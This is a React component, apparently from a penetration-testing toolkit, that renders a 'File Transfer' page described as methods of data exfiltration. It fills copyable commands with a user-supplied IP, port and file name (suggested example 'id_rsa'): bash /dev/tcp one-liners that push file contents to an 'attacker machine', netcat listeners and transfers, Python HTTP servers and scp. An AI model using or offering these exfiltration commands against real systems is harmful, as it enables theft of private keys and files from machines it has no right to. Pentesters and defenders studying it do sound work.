import React from 'react';
import PersistedState from 'use-persisted-state';
import { Typography, Row, Col, Divider, Input } from 'antd';
import { WifiOutlined, createFromIconfontCN, FolderOutlined } from '@ant-design/icons';
import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
import QueueAnim from 'rc-queue-anim';


const { Title, Paragraph, Text } = Typography;
const IconFont = createFromIconfontCN( {
    scriptUrl: [ './iconfont.js' ]
} );

export default function FileTransfer () {
    const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );

    const [ values, setValues ] = useIPv4State( {
        ip: '',
        port: '',
        file_name: '',
    } );
    const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
        setValues( { ...values, [ name ]: event.target.value } );
    };
    const bash_transfer = `bash -c 'echo -e "POST / HTTP/0.9 $(<${ values.file_name })" > /dev/tcp/${ values.ip }/${ values.port }'`;
    const bash_tcp_transfer = `bash -c 'cat ${ values.file_name } > /dev/tcp/${ values.ip }/${ values.port }'`;
    const bash_download = `bash -c 'cat < /dev/tcp/${ values.ip }/${ values.port } > ${ values.file_name }'`;
    const netcat_transfer = `nc ${ values.ip } ${ values.port } < ${ values.file_name }`;
    const python_server = `python3 -m http.server ${ values.port }`;
    const python2_server = `python -m SimpleHTTPServer ${ values.port }`;
    const scp = `scp ${ values.file_name } username@${ values.ip || 'IP' }:~/destination ${ values.port &&
        '-P ' + values.port }`;
    const scp_dl = `scp user@${ values.ip || 'IP' }:~/path_to_file file_saved ${ values.port && '-P ' + values.port }`;

    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                File Transfer
            </Title>
            <Paragraph style={{ margin: 15 }}>
                Various method of data exfiltration and download from a remote machine.
            </Paragraph>
            <div style={{ padding: 15 }}>
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={8}>
                        <Input
                            maxLength={15}
                            prefix={<WifiOutlined />}
                            name='Ip adress'
                            placeholder='IP Address or domain (ex: 212.212.111.222)'
                            onChange={handleChange( 'ip' )}
                            value={values.ip}
                        />
                    </Col>
                    <Col span={8}>
                        <Input
                            maxLength={5}
                            prefix={<IconFont type='icon-Network-Plug' />}
                            name='Port'
                            placeholder='Port (ex: 1337)'
                            onChange={handleChange( 'port' )}
                            value={values.port}
                        />
                    </Col>
                    <Col span={8}>
                        <Input
                            prefix={<FolderOutlined />}
                            name='File name'
                            placeholder='Filename (ex: id_rsa)'
                            onChange={handleChange( 'file_name' )}
                            value={values.file_name}
                        />
                    </Col>
                </Row>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>
                    Bash Upload <IconFont type='icon-gnubash' />
                </Title>
                <Text strong># Upload file over HTTP (require HTTP service running on the attacker machine)</Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{bash_transfer}</Text></pre>
                </Paragraph>
                <Text strong style={{ marginTop: '1em' }}>
                    # Exfiltrate file over TCP
                </Text>
                <Text strong style={{ marginTop: '1em' }}>
                    # Listen with Netcat on port {values.port} + output redirection
                </Text>
                <Paragraph copyable>
                    nc -l -p {values.port} {'>'} data
                </Paragraph>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{bash_tcp_transfer}</Text></pre>
                </Paragraph>
                <Title level={3}>
                    Bash Download <IconFont type='icon-gnubash' />
                </Title>
                <Text strong># Send via netcat</Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>nc -l -p {values.port} {'<'} {values.file_name}</Text></pre>
                </Paragraph>
                <Text strong># Download file on the other machine</Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{bash_download}</Text></pre>
                </Paragraph>
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='b'>
                <Title level={3}>
                    Netcat <IconFont type='icon-command-line' />
                </Title>
                <Text strong># Upload payload</Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>nc -lnvp ; {values.port}
                        {netcat_transfer}</Text></pre>
                </Paragraph>
                <Text strong style={{ marginTop: '2em' }}>
                    # Download
                </Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>nc {values.ip} {values.port} {'<'} {values.file_name}</Text></pre>
                </Paragraph>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>nc -lnvp {values.port} {'>'} file_saved</Text></pre>
                </Paragraph>
            </div>
            <Divider dashed />
            <div
                key='e'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>
                    Python <IconFont type='icon-python' />
                </Title>
                <Text strong># Python3 HTTP Server</Text>
                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
                    <pre><Text copyable>{python_server}</Text></pre>
                </Paragraph>
                <Text strong># Python2 HTTP Server</Text>
                <Paragraph ellipsis={true}>
                    <pre><Text copyable>{python2_server}</Text></pre>
                </Paragraph>
            </div>
            <Divider dashed />
            <div
                key='f'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>
                    SCP <IconFont type='icon-filelock' />
                </Title>
                <Text strong># Upload from local host to remote computer</Text>
                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
                    <pre><Text copyable>{scp}</Text></pre>
                </Paragraph>
                <Text strong># Download from remote computer</Text>
                <Paragraph ellipsis={true} style={{ marginBottom: '1em' }}>
                    <pre><Text copyable>{scp_dl}</Text></pre>
                </Paragraph>
            </div>
        </QueueAnim>
    );
}